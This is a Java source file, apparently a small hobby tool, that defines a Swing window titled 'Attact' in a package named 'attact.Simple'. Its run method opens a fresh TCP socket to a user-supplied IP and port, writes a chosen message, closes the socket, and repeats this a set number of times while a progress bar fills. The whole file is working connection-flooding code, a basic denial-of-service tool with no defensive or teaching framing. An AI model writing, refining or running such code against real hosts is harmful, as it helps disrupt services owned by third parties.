package cn.becomegood.fly.attact.Simple;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.JFrame;
import javax.swing.JProgressBar;

public class NewSimpleA extends JFrame implements Runnable {
	
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JProgressBar progress;
	private Integer i = 1;
	private String IP;
	private int	prot;
	private String message;
	private int times;
	private final Dimension DIMENSION = Toolkit.getDefaultToolkit().getScreenSize();
	public NewSimpleA(String IP,int prot,String message,int times) {
        super("Attact");
        this.IP = IP;
        this.prot = prot;
        this.message = message;
        this.times = times;
        progress = new JProgressBar(1, 100); // 实例化进度条
        progress.setStringPainted(true);      // 描绘文字
        this.add(progress);
//        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setBounds((int)DIMENSION.getWidth()/2-350/2, 0, 350, 50);
        this.setVisible(true);
    }

	@Override
	public void run() {
		InetAddress local = null;
		try {
			local = InetAddress.getByName(IP);
		} catch (UnknownHostException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		while(times>=this.i){
			try {
					Socket client = new Socket(local,prot);
					OutputStream OS = client.getOutputStream();
					PrintWriter PW = new PrintWriter(new OutputStreamWriter(OS,"UTF-8"));
					
				PW.write(message);
				PW.flush();
				OS.close();
				PW.close();
				client.close();
				synchronized (i) {
					progress.setValue((int)((i*1.0/times)*100));
					System.out.println(progress.getValue());	
					i++;
				}
			} catch (UnknownHostException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		i=1;
		this.dispose();
	}

}
